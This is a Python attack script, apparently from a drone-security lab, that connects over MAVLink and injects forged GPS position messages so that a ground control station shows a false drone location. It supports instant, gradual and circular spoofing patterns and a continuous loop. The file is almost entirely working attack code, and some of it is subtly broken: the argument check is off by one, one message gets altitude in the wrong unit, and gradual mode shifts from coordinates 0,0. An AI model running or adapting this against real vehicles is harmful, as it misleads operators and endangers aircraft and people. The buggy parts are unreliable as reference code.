#!/usr/bin/env python3
"""
GPS Spoofing Exploit Script
Injects fake GPS coordinates to mislead GCS about drone location
"""

import sys
import time
import math
from pymavlink import mavutil

def inject_gps_spoof(connection, lat, lon, alt, mode='instant'):
    """
    Inject spoofed GPS data
    
    Args:
        connection: MAVLink connection object
        lat: Latitude in degrees
        lon: Longitude in degrees
        alt: Altitude in meters
        mode: Spoofing mode ('instant', 'gradual', 'circular')
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    print(f"[*] Injecting GPS spoof: lat={lat}, lon={lon}, alt={alt}m (mode: {mode})")
    
    if mode == 'instant':
        # Send GPS data immediately
        send_gps_messages(connection, target_system, target_component, lat, lon, alt)
        print("[+] GPS spoof injected")
    
    elif mode == 'gradual':
        # Gradually shift position
        print("[*] Gradually shifting GPS position...")
        steps = 10
        for i in range(steps + 1):
            factor = i / steps
            current_lat = lat * factor
            current_lon = lon * factor
            current_alt = alt * factor
            send_gps_messages(connection, target_system, target_component, 
                            current_lat, current_lon, current_alt)
            time.sleep(0.5)
        print("[+] Gradual GPS shift complete")
    
    elif mode == 'circular':
        # Circular movement pattern
        print("[*] Creating circular GPS pattern...")
        radius = 0.001  # ~100 meters
        center_lat = lat
        center_lon = lon
        
        for angle in range(0, 360, 10):
            rad = math.radians(angle)
            offset_lat = radius * math.cos(rad)
            offset_lon = radius * math.sin(rad)
            current_lat = center_lat + offset_lat
            current_lon = center_lon + offset_lon
            
            send_gps_messages(connection, target_system, target_component,
                            current_lat, current_lon, alt)
            time.sleep(0.5)
        print("[+] Circular GPS pattern complete")

def send_gps_messages(connection, target_system, target_component, lat, lon, alt):
    """
    Send GPS_RAW_INT and GLOBAL_POSITION_INT messages
    
    Args:
        connection: MAVLink connection object
        target_system: Target system ID
        target_component: Target component ID
        lat: Latitude in degrees
        lon: Longitude in degrees
        alt: Altitude in meters
    """
    time_usec = int(time.time() * 1e6)
    time_boot_ms = int(time.time() * 1e3) % 4294967295
    
    # Convert to MAVLink format (degrees * 1e7)
    lat_int = int(lat * 1e7)
    lon_int = int(lon * 1e7)
    alt_mm = int(alt * 1000)  # Altitude in millimeters
    
    # Send GPS_RAW_INT
    connection.mav.gps_raw_int_send(
        time_usec,
        3,  # fix_type: 3D fix
        lat_int,
        lon_int,
        alt,  # Altitude in meters * 1000
        100,  # eph: GPS HDOP
        100,  # epv: GPS VDOP
        500,  # vel: GPS ground speed (cm/s)
        0,    # cog: Course over ground (degrees * 100)
        10    # satellites_visible
    )
    
    # Send GLOBAL_POSITION_INT
    connection.mav.global_position_int_send(
        time_boot_ms,
        lat_int,
        lon_int,
        alt_mm,      # Altitude in millimeters
        alt_mm,      # Relative altitude
        0, 0, 0,     # vx, vy, vz (velocity in cm/s)
        0            # hdg: Heading (degrees * 100)
    )

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 gps_spoofing.py <connection> <lat> <lon> <alt> [mode]")
        print("Example: python3 gps_spoofing.py udp:127.0.0.1:14550 37.7749 -122.4194 100")
        print("Example: python3 gps_spoofing.py udp:127.0.0.1:14550 37.7749 -122.4194 100 gradual")
        print("\nModes: instant (default), gradual, circular")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    lat = float(sys.argv[2])
    lon = float(sys.argv[3])
    alt = float(sys.argv[4])
    mode = sys.argv[5] if len(sys.argv) > 5 else 'instant'
    
    if mode not in ['instant', 'gradual', 'circular']:
        print("[-] Mode must be 'instant', 'gradual', or 'circular'")
        sys.exit(1)
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Inject GPS spoof
    if mode == 'instant':
        inject_gps_spoof(connection, lat, lon, alt, mode)
    else:
        # For gradual/circular, run continuously
        print("[*] Running continuous GPS spoofing (Press Ctrl+C to stop)...")
        try:
            while True:
                inject_gps_spoof(connection, lat, lon, alt, mode)
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping GPS spoofing...")

if __name__ == "__main__":
    main()
